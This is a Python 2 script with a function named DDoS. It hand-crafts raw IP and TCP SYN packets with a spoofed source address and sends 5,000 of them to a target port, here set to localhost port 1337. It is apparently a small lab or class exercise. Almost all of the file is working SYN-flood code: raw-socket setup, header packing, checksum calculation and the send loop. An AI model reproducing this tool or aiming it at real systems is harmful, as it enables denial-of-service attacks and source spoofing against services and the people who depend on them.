from multiprocessing import Process, Queue, Manager, Pool
import SocketServer
import ssl
global struct
from socket import * #want lower level than built-in tcp servers
#from struct import * #want for packing packets
import struct
import sys
import logging
import math
import timeit
import array

global checksum
global DDoS
def execute():
    return DDoS("127.0.0.1", 1337)

def checksum(msg):
    s = sum([(ord(msg[i*2]) << 8) + ord(msg[i*2+1]) for i in range(len(msg)/2)])

    s = (s>>16) + (s & 0xffff)

    #complement and mask to 4 byte short
    s = ~s & 0xffff

    #print [(c, ord(c)) for c in msg]
    return s

def DDoS(dip, dport):
    HTTPS = False
    port = dport
    dstip = dip

    srcip = "10.0.0.23"
    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    #we manually craft a packet
    #scapy would be nice, but can't guarantee it's on every computer
    #ip header fields
    #used http://www.binarytides.com/raw-socket-programming-in-python-linux/
    #for help creating packet
    ipver = 4
    ipihl = 5
    iptos = 0
    iptotlen = 40
    ipid = 1
    ipfragoff = 0
    ipttl = 64
    ipproto = IPPROTO_TCP
    ipcheck = 0
    ipsaddr = inet_aton(srcip)
    ipdaddr = inet_aton(dstip)

    ipihlver = (ipver << 4) + ipihl
    ipheader = struct.pack('!BBHHHBBH4s4s', ipihlver, iptos, iptotlen, ipid, ipfragoff, ipttl, ipproto, ipcheck, ipsaddr, ipdaddr)

    #tcp stuff
    tcpsrc = 1337
    tcpdst = port
    tcpseq = 0
    tcpackseq = 0
    tcpdoff = 5
    tcpfin = 0
    tcpsyn = 1
    tcprst = 0
    tcppsh = 0
    tcpack = 0
    tcpurg = 0
    tcpwin = 8192
    tcpchk = 0
    tcpupr = 0

    tcpoffsetres = (tcpdoff << 4) + 0
    tcpflags = tcpfin + (tcpsyn << 1) + (tcprst << 2) + (tcppsh << 3) + (tcpack << 4) + (tcpurg << 5)

    tcpheader = struct.pack('!HHLLBBHHH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin, tcpchk, tcpupr)

    data = ''
    placeholder = 0
    tcplen = htons(len(tcpheader)+len(data))

    psh = struct.pack('4s4sBBH', ipsaddr, ipdaddr, placeholder, ipproto, tcplen)
    psh += tcpheader + data

    tcpchk = htons(checksum(psh))
    #print tcpchk
    ex= str("".join([c[0] for c in ('\n', 10), ('\x84', 132), ('\xaa', 170), ('\x1f', 31), ('\n', 10), ('\x00', 0), ('\x00', 0), ('\x17', 23), ('\x00', 0), ('\x06', 6), ('\x00', 0), ('\x14', 20), ('\x05', 5), ('9', 57), ('\x05', 5), ('9', 57), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('P', 80), ('\x02', 2), (' ', 32), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0)]))
    #print checksum(ex)
    #for a,b in zip(psh, ex):
    #print ord(a), ord(b)
    tcpheader = struct.pack('!HHLLBBH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin) + struct.pack('H', tcpchk) + struct.pack('!H', tcpupr)

    packet = ipheader + tcpheader + data
    count = 0
    while count < 5000:
        s.sendto(packet, (dip, port))
        count += 1
    return count
